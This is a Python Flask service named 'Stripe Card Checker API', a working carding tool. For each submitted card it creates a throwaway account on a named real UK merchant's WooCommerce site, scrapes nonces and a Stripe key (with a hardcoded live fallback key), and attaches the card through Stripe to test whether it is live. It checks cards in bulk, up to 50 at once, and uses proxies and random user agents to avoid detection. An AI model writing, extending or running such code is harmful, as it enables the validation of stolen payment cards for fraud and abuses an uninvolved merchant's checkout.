from flask import Flask, request, jsonify
import asyncio
import re
import json
import random
import aiohttp
from datetime import datetime
import uuid
import warnings
from fake_useragent import UserAgent

warnings.filterwarnings('ignore')

app = Flask(__name__)

# ────────────────────────── helper functions ──────────────────────────

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

def parse_proxy_line(line: str) -> str or None:
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = f"{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = f"{user}:{pwd}"
            address = f"{host}:{port}"
        else:
            return None
    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url

# ──────────────────────── stripe auth logic ──────────────────────────

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
                         gets(payment_page_text, 'data-key="pk_', '"') or 
                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

# ─────────────────────── single card check ───────────────────────────

async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    response_lower = response_msg.lower()
    if 'requires_action' in response_lower or 'succeeded' in response_lower:
        status = 'Approved'
        is_live = True
    elif is_approved:
        status = 'Approved'
        is_live = True
    else:
        status = 'Declined'
        is_live = False
    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'status': status,
        'response': response_msg,
        'is_live': is_live
    }

# ──────────────────────── Helper to run async code ──────────────────────────

def run_async(coro):
    """Run async coroutine in a new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ──────────────────────── Single API Endpoint ──────────────────────────────

@app.route('/check/', methods=['GET', 'POST'])
def check_api():
    """
    Single endpoint for both single and mass card checking
    GET: Single card check
    POST: Single or mass card check
    
    GET: /check/?cc=5129925506260283|02|2028|384&proxy=http://user:pass@proxy:port
    
    POST: 
    {
        "cards": [
            "5129925506260283|02|2028|384",
            "4111111111111111|12|2026|123"
        ],
        "proxy": "http://user:pass@proxy:port",
        "concurrency": 10
    }
    """
    
    # ────── GET Request - Single Card ──────
    if request.method == 'GET':
        cc_param = request.args.get('cc')
        proxy_param = request.args.get('proxy', '')
        
        if not cc_param:
            return jsonify({
                'success': False,
                'error': 'Missing cc parameter',
                'format': '/check/?cc=cardnumber|month|year|cvv&proxy=proxy_url'
            }), 400
        
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({
                'success': False,
                'error': 'Invalid card format. Use: number|month|year|cvv'
            }), 400
        
        cc, mes, ano, cvv = parts
        
        proxy = None
        if proxy_param and proxy_param.strip():
            proxy = parse_proxy_line(proxy_param)
            if not proxy:
                return jsonify({
                    'success': False,
                    'error': 'Invalid proxy format'
                }), 400
        
        try:
            result = run_async(check_card(cc, mes, ano, cvv, proxy=proxy))
            return jsonify({
                'success': True,
                'type': 'single',
                'card': result['cc'],
                'status': result['status'],
                'response': result['response'],
                'is_live': result['is_live']
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': f'System error: {str(e)}'
            }), 500
    
    # ────── POST Request - Single or Mass ──────
    else:
        data = request.get_json()
        if not data:
            return jsonify({
                'success': False,
                'error': 'Missing JSON body'
            }), 400
        
        cards_data = data.get('cards')
        proxy_param = data.get('proxy', '')
        concurrency_param = data.get('concurrency', 10)
        
        # If single card provided as string
        if isinstance(cards_data, str):
            cards_data = [cards_data]
        
        if not cards_data:
            return jsonify({
                'success': False,
                'error': 'Missing cards array in JSON',
                'format': {
                    'cards': ['cardnumber|month|year|cvv', 'cardnumber|month|year|cvv'],
                    'proxy': 'http://user:pass@proxy:port (optional)',
                    'concurrency': 10
                }
            }), 400
        
        # Parse cards
        cards = []
        for card in cards_data:
            if isinstance(card, str):
                parts = card.split('|')
                if len(parts) == 4:
                    cards.append({
                        'cc': parts[0],
                        'mes': parts[1],
                        'ano': parts[2],
                        'cvv': parts[3]
                    })
            elif isinstance(card, dict):
                if all(k in card for k in ['cc', 'mes', 'ano', 'cvv']):
                    cards.append(card)
        
        if not cards:
            return jsonify({
                'success': False,
                'error': 'No valid cards found'
            }), 400
        
        # Parse concurrency
        try:
            concurrency = int(concurrency_param)
            concurrency = min(concurrency, 50)
        except:
            concurrency = 10
        
        # Parse proxy
        proxy = None
        if proxy_param and proxy_param.strip():
            proxy = parse_proxy_line(proxy_param)
            if not proxy:
                return jsonify({
                    'success': False,
                    'error': 'Invalid proxy format'
                }), 400
        
        try:
            # If only one card, return single format
            if len(cards) == 1:
                result = run_async(check_card(
                    cards[0]['cc'], 
                    cards[0]['mes'], 
                    cards[0]['ano'], 
                    cards[0]['cvv'], 
                    proxy=proxy
                ))
                return jsonify({
                    'success': True,
                    'type': 'single',
                    'card': result['cc'],
                    'status': result['status'],
                    'response': result['response'],
                    'is_live': result['is_live']
                })
            
            # Mass check
            async def mass_check_async():
                sem = asyncio.Semaphore(concurrency)
                results = []
                
                async def worker(card_data):
                    async with sem:
                        result = await check_card(
                            card_data['cc'], 
                            card_data['mes'], 
                            card_data['ano'], 
                            card_data['cvv'], 
                            proxy=proxy
                        )
                        return result
                
                tasks = [asyncio.create_task(worker(card)) for card in cards]
                results = await asyncio.gather(*tasks)
                return results
            
            results = run_async(mass_check_async())
            
            approved = sum(1 for r in results if r['is_live'])
            declined = sum(1 for r in results if not r['is_live'])
            
            return jsonify({
                'success': True,
                'type': 'mass',
                'total': len(results),
                'approved': approved,
                'declined': declined,
                'results': results
            })
            
        except Exception as e:
            return jsonify({
                'success': False,
                'error': f'System error: {str(e)}'
            }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'running',
        'message': 'Stripe Card Checker API is operational'
    })

@app.route('/', methods=['GET'])
def index():
    """API information"""
    return jsonify({
        'name': 'Stripe Card Checker API',
        'version': '3.0',
        'endpoint': '/check/',
        'methods': ['GET', 'POST'],
        'usage': {
            'GET': {
                'params': {
                    'cc': 'cardnumber|month|year|cvv (required)',
                    'proxy': 'http://user:pass@proxy:port (optional)'
                },
                'example': '/check/?cc=5129925506260283|02|2028|384&proxy=http://user:pass@proxy:8080'
            },
            'POST': {
                'body': {
                    'cards': 'array of cards (required)',
                    'proxy': 'http://user:pass@proxy:port (optional)',
                    'concurrency': 'integer, default 10 (optional)'
                },
                'example': {
                    'cards': ['5129925506260283|02|2028|384', '4111111111111111|12|2026|123'],
                    'proxy': 'http://user:pass@proxy:8080',
                    'concurrency': 10
                }
            }
        }
    })

# ──────────────────────── Main entry point ──────────────────────────

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)